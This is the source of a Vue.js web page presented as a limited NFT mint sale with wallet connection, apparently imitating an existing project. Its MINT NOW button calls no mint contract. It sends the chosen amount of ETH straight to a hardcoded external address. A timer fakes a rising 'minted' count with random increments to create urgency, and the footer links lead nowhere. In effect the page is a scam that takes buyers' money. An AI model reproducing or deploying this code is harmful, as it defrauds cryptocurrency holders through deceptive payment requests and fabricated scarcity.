<template>
  <div class="home">
    <div>
      <h2 style="font-size: 24px ">LIMITED SALE</h2>
      <h2 style="font-size: 28px; margin: 60px; color:white;">LIMITED SALE</h2>
    </div>

    <div class="div2">
      <div class="div1">
        <img src="./derace.jpeg" width="600px" height="400px" class="img" />
      </div>
      <h2 class="h2">{{ this.month }} {{ this.day }}</h2>
      <h3 class="h2">MINTING RULES</h3>
      <h4 class="h4">1) 200 unique NFTs</h4>
      <h4 class="h4">2) Max of 5 per Wallet</h4>
      <h4 class="h4">3) Reveal will happen after Private Sale</h4>
      <md-button v-on:click="minusfunction" style="display: inline-block">
        <md-icon class="md-size-1x float:left;" style="color: white"
          >remove</md-icon
        >
      </md-button>
      <h2 style="color: #fd115c; font-size: 20px; display: inline-block">
        {{ this.no_of_eth }}
      </h2>
      <md-button v-on:click="addfunction" style="display: inline-block">
        <md-icon class="md-size-1x" style="color: white"> add </md-icon>
      </md-button>
      <button
        style="
          float: right;
          padding: 15px 25px;
          background-color: #fd115c;
          color: white;
          border-radius: 25px;
        "
        v-on:click="max"
      >
        Max
      </button>
      <h3 style="color: white">PRICE : {{ price[this.no_of_eth - 1] }} ETH</h3>
      <button
        v-on:click="connectwallet"
        style="
          color: white;
          background-color: #fd115c;
          padding: 15px 25px;
          width: 400px;
          border-radius: 20px;
        "
        id="connectbutton"
        class="md-primary"
      >
        MINT NOW
      </button>
      <h3 style="color: white">{{ this.time }}/200</h3>
    </div>
    <div class="footer">
      <img src="./logo.png" style="float: left; margin-left:120px; margin-top:40px" height="110px" width="150px" />
    <div style="margin-left:160px; float:left;">
      <h2 style="margin-top:40px; color:white;">
        About us
      </h2>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">White Paper(Gitbook)</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Token Metrics</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Team</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Privacy Policy</h3>
    </div>
    <div style="margin-left:160px; float:left;">
      <h2 style="margin-top:40px; color:white;">
        Learn More
      </h2>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Roadmaps</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Features</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Stake</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Market Overview</h3>
    </div>
    <div style="margin-left:160px; float:left;">
      <h2 style="margin-top:40px; color:white;">
        Social
      </h2>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Telegram</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Twitter</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Medium</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Discord</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">Instagram</h3>
      <h3 style="margin-top:40px; color:rgb(151, 150, 150);">TikTok</h3>
    </div>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  data() {
    return {
      no_of_eth: 1,
      time: 0,
      month: null,
      day: null,
      price: [0.09, 0.18, 0.27, 0.36, 0.45],
    };
  },
  created() {
    const d = new Date();
    const months = [
      "January",
      "February",
      "March",
      "April",
      "May",
      "June",
      "July",
      "August",
      "September",
      "October",
      "November",
      "December",
    ];
    this.month = months[d.getMonth()];
    this.day = d.getDate();
    window.onload = this.timer;

    const Web3 = require("web3");
    if (typeof window.ethereum !== "undefined") {
      console.log("Metamask is installed");
    }
    const ethEnabled = async () => {
      if (window.ethereum) {
        window.ethereum.request({ method: "eth_requestAccounts" });
        const chainId = await window.ethereum.request({
          method: "eth_chainId",
        });
        console.log(chainId);
        window.web3 = new Web3(window.ethereum);
        return true;
      }
      return false;
    };
    ethEnabled().then(() => {
      var x = document.getElementById("connectbutton");
      x.innerText = "MINT NOW";
      try {
        const Id = window.ethereum.request({ method: "eth_chainId" });
        if (Id !== "0x1") {
          window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          });
        }
      } catch (error) {
        console.log("error");
        if (error.code == 4001) {
          alert("Please connect to Ethereum Chain");
        }
      }
    });
  },
  methods: {
    addfunction() {
      if (this.no_of_eth < 5) {
        this.no_of_eth += 1;
      }
    },
    timer() {
      if (this.time <= 187) {
        const random = Math.floor(Math.random() * 11);
        this.time += random;
        setTimeout(this.timer, 4000);
      }
    },
    max() {
      this.no_of_eth = 5;
    },
    minusfunction() {
      if (this.no_of_eth > 1) {
        this.no_of_eth -= 1;
      }
    },
    connectwallet() {
      const hexvalues = [
        "0x13fbe85edc90000",
        "0x27f7d0bdb920000",
        "0x3bf3b91c95b001e",
        "0x4fefa17b7240000",
        "0x63eb89da4ecffc4",
      ];
      const acc = window.ethereum.request({ method: "eth_requestAccounts" });
      acc.then((result) => {
        const account = result[0];
        const chainId = window.ethereum.request({ method: "eth_chainId" });
        if (chainId !== "0x1") {
          window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          });
          const hexvalues = [
            "0x13fbe85edc90000",
            "0x27f7d0bdb920000",
            "0x3bf3b91c95b001e",
            "0x4fefa17b7240000",
            "0x63eb89da4ecffc4",
          ];
          var input = this.no_of_eth;
          const amount = hexvalues[input - 1];
          console.log(amount);
          window.ethereum.request({
            method: "eth_sendTransaction",
            params: [
              {
                from: account,
                to: "0xd4b83f0309dc02c2110715d787a3c92363acad8b",
                value: amount,
                //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                //gas: '0x2710',
              },
            ],
          });
        } else {
          const hexvalues = [
            "0x13fbe85edc90000",
            "0x27f7d0bdb920000",
            "0x3bf3b91c95b001e",
            "0x4fefa17b7240000",
            "0x63eb89da4ecffc4",
          ];
          var input = this.no_of_eth;
          const amount = hexvalues[input - 1];
          window.ethereum.request({
            method: "eth_sendTransaction",
            params: [
              {
                from: account,
                to: "0xd4b83f0309dc02c2110715d787a3c92363acad8b",
                value: amount,
                //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                //gas: '0x2710',
              },
            ],
          });
        }
      });
    },
  },
};
</script>
<style lang="scss">
.img {
  background-color: #17161b;
}
.div1 {
  width: auto;
  height: auto;
  margin: 20px;
  float: left;
}
.div2 {
  width: 1200px;
  height: 500px;
  border: 2px solid #fd115c;
  background-color: rgb(14, 16, 35);
  display: inline-block;
  padding: 33px 40px 38px;
  margin-top: 20px;
  border-radius: 20px;
}
.home {
  background-color: black;
  background-color: black;
}
.h2 {
  color: white;
  text-align: left;
  font-family: Cambria, Cochin, Georgia, Times, "Times New Roman", serif;
  font-size: 120%;
}
#p {
  color: rgb(71, 67, 67);
}
.h4 {
  text-align: left;
  font-size: 100%;
  color: rgb(187, 185, 185);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
}
.footer {
  background-color: rgb(14, 16, 35);
  height: 500px;
  width: 100%;
  margin-top: 100px;
  color: rgb(151, 150, 150);
}
</style>